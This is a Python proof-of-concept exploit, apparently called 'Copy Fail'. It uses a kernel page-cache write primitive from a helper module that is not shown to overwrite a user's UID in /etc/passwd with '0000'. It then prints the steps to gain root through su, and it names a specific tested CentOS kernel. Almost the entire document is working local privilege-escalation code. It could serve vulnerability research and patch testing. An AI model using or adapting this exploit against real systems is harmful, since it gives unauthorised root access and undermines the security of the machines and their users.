#!/usr/bin/env python3
"""
Copy Fail — /etc/passwd UID tampering
======================================
Overwrites a user's UID field from "1000" to "0000" in page cache,
granting root privileges via `su - <username>`.

Tested on: CentOS Stream 8, kernel 4.18.0-553.6.1.el8
"""
import os
import sys
from copyfail_core import page_cache_write_4bytes

TARGET_FILE = "/etc/passwd"
TARGET_USER = sys.argv[1] if len(sys.argv) > 1 else "testuser123"
ORIGINAL_UID = b"1000"
TAMPERED_UID = b"0000"


def find_uid_offset(path, username):
    """Locate the UID field offset for the given username in /etc/passwd."""
    with open(path) as f:
        content = f.read()

    prefix = f"{username}:x:"
    pos = content.find(prefix)
    if pos < 0:
        print(f"[-] User '{username}' not found in {path}")
        sys.exit(1)

    uid_offset = pos + len(prefix)
    uid_end = content.index(":", uid_offset)
    uid_str = content[uid_offset:uid_end]
    return uid_offset, uid_str


def main():
    uid_offset, current_uid = find_uid_offset(TARGET_FILE, TARGET_USER)
    print(f"[*] User: {TARGET_USER}")
    print(f"[*] Current UID: {current_uid} at offset {uid_offset}")

    if current_uid == "0":
        print("[!] UID is already 0")
        sys.exit(1)

    if current_uid != ORIGINAL_UID.decode():
        print(f"[!] UID is '{current_uid}', expected '{ORIGINAL_UID.decode()}'")
        print("[!] Adjust ORIGINAL_UID / TAMPERED_UID for your target")
        sys.exit(1)

    fd = os.open(TARGET_FILE, os.O_RDONLY)

    print(f"[*] Writing UID={TAMPERED_UID.decode()} at offset {uid_offset}")
    page_cache_write_4bytes(fd, uid_offset, TAMPERED_UID)

    # Verify
    os.lseek(fd, uid_offset, os.SEEK_SET)
    result = os.read(fd, 4)
    os.close(fd)

    if result == TAMPERED_UID:
        print(f"[+] SUCCESS: UID changed to {TAMPERED_UID.decode()} in page cache")
        print(f"[*] Verify: id {TARGET_USER}")
        print(f"[*] Exploit: su - {TARGET_USER}")
        print(f"[*] Restore: echo 3 > /proc/sys/vm/drop_caches")
    else:
        print(f"[-] FAILED: read back {result.hex()}")


if __name__ == "__main__":
    main()
